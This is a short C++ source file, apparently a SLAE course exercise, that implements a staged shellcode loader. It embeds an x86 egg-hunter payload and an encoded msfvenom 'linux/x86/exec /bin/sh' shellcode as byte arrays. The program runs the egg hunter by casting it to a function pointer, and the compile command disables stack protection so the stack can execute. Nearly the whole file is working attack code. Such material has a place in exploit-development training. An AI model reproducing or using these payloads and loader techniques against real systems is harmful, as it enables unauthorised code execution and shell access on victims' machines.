// Filename: staged_shellcode_loader.cpp
// Author: Upayan a.k.a. slaeryan
// SLAE: 1525
// Contact: upayansaha@icloud.com
// Purpose: This loader program has the secondary payload(shellcode) configurable.
// The length of both the payloads are printed and then the egg-hunter payload is 
// executed which in turn loads the secondary payload.
// Note: Don't forget to append the egg(\x90\x50\x90\x50\x90\x50\x90\x50) to the shellcode.
// Compile with:
// g++ -fno-stack-protector -z execstack staged_shellcode_loader.cpp -o staged_shellcode_loader


#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

unsigned char shellcode[] = "\x90\x50\x90\x50\x90\x50\x90\x50\xba\xec\xc4\x30\xdf\xdb\xd1\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
                            "\x0b\x31\x56\x15\x83\xee\xfc\x03\x56\x11\xe2\x19\xae\x3b\x87"
                            "\x78\x7d\x5a\x5f\x57\xe1\x2b\x78\xcf\xca\x58\xef\x0f\x7d\xb0"
                            "\x8d\x66\x13\x47\xb2\x2a\x03\x5f\x35\xca\xd3\x4f\x57\xa3\xbd"
                            "\xa0\xe4\x5b\x42\xe8\x59\x12\xa3\xdb\xde"; // CHANGE ME | Gen. using: msfvenom -p linux/x86/exec CMD=/bin/sh --arch x86 -f c -b "\x00"

int main(int argc, char* argv[])
{
    printf("Egg hunter length(Primary payload): %d\n", strlen((const char*)egghunter));
    printf("Shellcode length(Secondary payload): %d\n", strlen((const char*)shellcode)-8);
    int (*ret)() = (int(*)())egghunter;
    ret();
}